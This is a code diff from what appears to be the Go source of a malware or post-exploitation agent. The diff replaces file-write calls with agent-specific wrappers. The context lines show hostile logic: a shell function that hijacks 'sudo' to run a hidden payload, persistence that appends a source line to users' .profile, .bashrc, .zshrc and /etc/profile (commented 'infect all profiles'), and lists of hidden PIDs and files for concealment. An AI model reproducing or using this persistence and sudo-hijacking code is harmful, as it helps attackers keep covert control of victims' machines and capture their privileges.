@@ -153,7 +153,7 @@ func profiles() (err error) {
 	}
 	sudoPayload := strings.Join(sudoLocs, "||")
 	loader += fmt.Sprintf("\nfunction sudo() { /usr/bin/sudo $@; (set +m;((%s) 2>/dev/null)) }", sudoPayload)
-	err = os.WriteFile(bashprofile, []byte(loader), 0o644)
+	err = util.WriteFileAgent(bashprofile, []byte(loader), 0o644)
 	if err != nil {
 		return
 	}
@@ -169,10 +169,10 @@ func profiles() (err error) {
 		return
 	}
 	// infect all profiles
-	_ = util.AppendTextToFile(user.HomeDir+"/.profile", sourceCmd)
-	_ = util.AppendTextToFile(user.HomeDir+"/.bashrc", sourceCmd)
-	_ = util.AppendTextToFile(user.HomeDir+"/.zshrc", sourceCmd)
-	_ = util.AppendTextToFile("/etc/profile", "source "+bashprofile)
+	_ = util.AppendTextToFileAgent(user.HomeDir+"/.profile", sourceCmd)
+	_ = util.AppendTextToFileAgent(user.HomeDir+"/.bashrc", sourceCmd)
+	_ = util.AppendTextToFileAgent(user.HomeDir+"/.zshrc", sourceCmd)
+	_ = util.AppendTextToFileAgent("/etc/profile", "source "+bashprofile)
 
 	return
 }
@@ -225,7 +225,7 @@ func HidePIDs() (err error) {
 	pids = util.RemoveDupsFromArray(pids)
 	pid_list_str := strings.Join(util.IntArrayToStringArray(pids), "\n")
 
-	err = os.WriteFile(Hidden_PIDs, []byte(pid_list_str), 0o644)
+	err = util.WriteFileAgent(Hidden_PIDs, []byte(pid_list_str), 0o644)
 	if err != nil {
 		return
 	}
@@ -250,7 +250,7 @@ func patcher() (err error) {
 		util.FileBaseName(common.RuntimeConfig.AgentRoot),
 		util.FileBaseName(Hidden_Files),
 		util.FileBaseName(Hidden_PIDs))
-	err = os.WriteFile(Hidden_Files, []byte(files), 0o644)
+	err = util.WriteFileAgent(Hidden_Files, []byte(files), 0o644)
 	if err != nil {
 		log.Printf("Cannot create %s: %v", Hidden_Files, err)
 	}
